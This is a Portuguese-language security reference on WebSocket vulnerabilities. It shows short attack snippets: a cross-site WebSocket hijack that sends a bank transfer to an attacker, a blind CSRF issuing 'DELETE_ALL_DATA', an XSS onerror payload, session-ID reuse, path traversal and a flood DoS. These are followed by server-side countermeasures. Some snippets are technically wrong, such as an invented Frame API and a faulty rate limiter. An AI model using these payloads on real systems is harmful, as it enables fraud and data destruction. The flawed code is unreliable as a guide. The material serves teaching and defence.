# WebSockets Vulnerabilities

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 7.1 (Alto) |
| **OWASP** | WebSocket Security |
| **CWE** | CWE-20, CWE-352 |
| **Status** | ⚠️ Ativo |
| **Impacto** | Data Exfiltration, CSRF, XSS, Auth Bypass |

---

## 🔍 O que são WebSockets?

WebSockets permitem comunicação bidirecional assíncrona entre cliente e servidor sobre uma única conexão TCP. Diferente de HTTP, são "sempre conectados".

**Características:**
- Iniciados com handshake HTTP
- Comunicação full-duplex (ambas direções)
- Menor overhead que HTTP polling
- Usado em: chat, real-time notifications, gaming, trading

**Vulnerabilidades:** Praticamente qualquer falha HTTP também pode ocorrer em WebSockets

---

## 💥 Exemplos Práticos de Exploração

### 1. **WebSocket Básico**

**Cliente conecta:**
```
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

**Servidor responde:**
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

---

### 2. **WebSocket CSRF**

**Cenário:** Transfer de dinheiro via WebSocket sem proteção

```javascript
// Página maliciosa em attacker.com
const ws = new WebSocket('wss://bank.example.com/transfer');
ws.onopen = function() {
    ws.send(JSON.stringify({
        action: 'transfer',
        amount: 1000,
        to: 'attacker@bank.com'
    }));
};
```

**Exploração:**
1. Vítima autenticada em bank.example.com
2. Vítima visita attacker.com
3. WebSocket é estabelecido com autenticação cookies
4. Transferência é executada

### 3. **Análise de Mensagens - Session Hijacking**

**Interceptar com Burp Suite:**
```
-> {"action": "login", "username": "admin", "password": "secret"}
<- {"status": "ok", "sessionId": "abc123xyz"}

-> {"action": "getBalance"}
<- {"balance": "$50,000"}
```

**Hijacking:**
```javascript
const ws = new WebSocket('wss://bank.example.com/account');
const frame = new WebSocket.Frame({
    opcode: 0x1,  // Text
    payload: '{"sessionId": "abc123xyz", "action": "getBalance"}'
});
// Enviar mensagem com sessionId roubado
```

### 4. **XSS via WebSocket**

**Mensagem de chat sem sanitização:**
```javascript
// Client recebe e processa sem sanitizar
ws.onmessage = function(event) {
    document.getElementById('chat').innerHTML += event.data;
    // XSS se event.data contiver <script>
};
```

**Exploit:**
```javascript
ws.send('<img src=x onerror="alert(\'XSS\')">');
// Todos conectados ao chat são afetados
```

### 5. **Manipulação de Dados em Tempo Real**

**Jogo ou aplicação em tempo real:**
```javascript
// Cliente envia movimento
ws.send(JSON.stringify({
    x: 100,
    y: 50,
    action: 'attack'
}));
```

**Manipulação:**
```javascript
// Atacante modifica coordenadas
ws.send(JSON.stringify({
    x: 99999,  // Coordenada inválida
    y: 99999,
    action: 'teleport'
}));
```

---

### 6. **Blind WebSocket CSRF**

**Aplicação não valida origem:**
```javascript
// attacker.com
const ws = new WebSocket('wss://admin-panel.internal/commands');
ws.onopen = function() {
    ws.send('DELETE_ALL_DATA');
};
```

**Resultado:** Comando executado sem validação

### 7. **Path Traversal em WebSocket**

**Conectar a endpoint privado:**
```
GET /../../admin/websocket HTTP/1.1
Upgrade: websocket
```

### 8. **WebSocket com Autenticação Fraca**

```javascript
// Token em URL (visível em logs)
GET /ws?token=abc123 HTTP/1.1
Upgrade: websocket

// Ou token em header de inicialização
Sec-WebSocket-Key: abc123
```

**Exploração:**
- Token visible em logs
- Reutilização de token
- Sem expiração de token

---

### 9. **DoS via WebSocket**

**Enviar dados massivos:**
```javascript
const payload = 'A'.repeat(1000000);  // 1MB
ws.send(payload);  // Repetir muitas vezes
```

**Resultado:**
- Consumo de memória no servidor
- Conexão cai
- DoS para outros usuários

### 10. **Insecure WebSocket (ws:// vs wss://)**

```javascript
// ❌ Sem encriptação
const ws = new WebSocket('ws://example.com/chat');

// ✅ Com encriptação TLS
const ws = new WebSocket('wss://example.com/chat');
```

**Risco:** Man-in-the-middle attack, credential theft

---

## 🛡️ Contramedidas e Prevenção

### 1. **Validar Origem**

```javascript
// Server-side validation
const ws = require('ws');
const server = new ws.Server({ 
    verifyClient: (info) => {
        const origin = info.origin;
        // Whitelist de origins
        const allowed = [
            'https://example.com',
            'https://app.example.com'
        ];
        return allowed.includes(origin);
    }
});
```

### 2. **Autenticação e Autorização**

```javascript
// Validar token antes de aceitar conexão
server.on('connection', (ws, req) => {
    const token = extractTokenFromUrl(req.url);
    
    if (!isValidToken(token)) {
        ws.close(1008, 'Invalid token');
        return;
    }
    
    const user = getUserFromToken(token);
    ws.user = user;
});
```

### 3. **CSRF Protection**

```javascript
// Usar CSRF token no handshake
GET /ws?csrf_token=xyz123 HTTP/1.1
Upgrade: websocket

// Server valida token
const token = url.searchParams.get('csrf_token');
if (!verifyCsrfToken(token, session)) {
    ws.close(1008, 'CSRF token invalid');
}
```

### 4. **Sanitizar Dados**

```javascript
// Sanitizar mensagens antes de broadcast
server.on('connection', (ws) => {
    ws.on('message', (data) => {
        const cleaned = DOMPurify.sanitize(data);
        
        // Broadcast para clientes
        server.clients.forEach(client => {
            if (client.readyState === ws.OPEN) {
                client.send(cleaned);
            }
        });
    });
});
```

### 5. **Rate Limiting**

```javascript
const rateLimit = require('express-rate-limit');

server.on('connection', (ws, req) => {
    let messageCount = 0;
    
    ws.on('message', (data) => {
        messageCount++;
        
        if (messageCount > 10) {  // 10 mensagens
            ws.close(1008, 'Rate limit exceeded');
            return;
        }
        
        // Reset a cada segundo
        setTimeout(() => { messageCount = 0; }, 1000);
    });
});
```

### 6. **Use WSS (WebSocket Secure)**

```javascript
// ✅ Seguro - TLS encryptado
const server = new ws.Server({
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
});
```

### 7. **Limitar Tamanho de Mensagem**

```javascript
const server = new ws.Server({
    maxPayload: 100 * 1024  // 100KB máximo
});
```

### 8. **Implementar Timeout**

```javascript
server.on('connection', (ws, req) => {
    let isAlive = true;
    
    ws.on('pong', () => {
        isAlive = true;
    });
    
    const interval = setInterval(() => {
        if (!isAlive) {
            ws.terminate();
            return;
        }
        isAlive = false;
        ws.ping();
    }, 30000);  // Ping a cada 30s
});
```

### 9. **Logging e Monitoring**

```javascript
server.on('connection', (ws, req) => {
    console.log(`[${new Date().toISOString()}] WebSocket connected: ${req.ip}`);
    
    ws.on('message', (data) => {
        console.log(`[Message] ${req.ip}: ${data}`);
    });
    
    ws.on('close', () => {
        console.log(`[Disconnect] ${req.ip}`);
    });
});
```

### 10. **Usar Bibliotecas Seguras**

```javascript
// Socket.io (com proteções)
const io = require('socket.io')(server, {
    cors: {
        origin: 'https://example.com',
        credentials: true
    }
});

io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if (!verifyToken(token)) {
        return next(new Error('Authentication error'));
    }
    next();
});
```

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/websockets |
| OWASP WebSocket | https://owasp.org/www-community/attacks/WebSocket_Protocol |
| MDN WebSocket | https://developer.mozilla.org/en-US/docs/Web/API/WebSocket |
| Socket.io Security | https://socket.io/docs/v4/socket-io-security/ |
| CWE-20 | https://cwe.mitre.org/data/definitions/20.html |

---

**Última atualização:** Agosto 2026
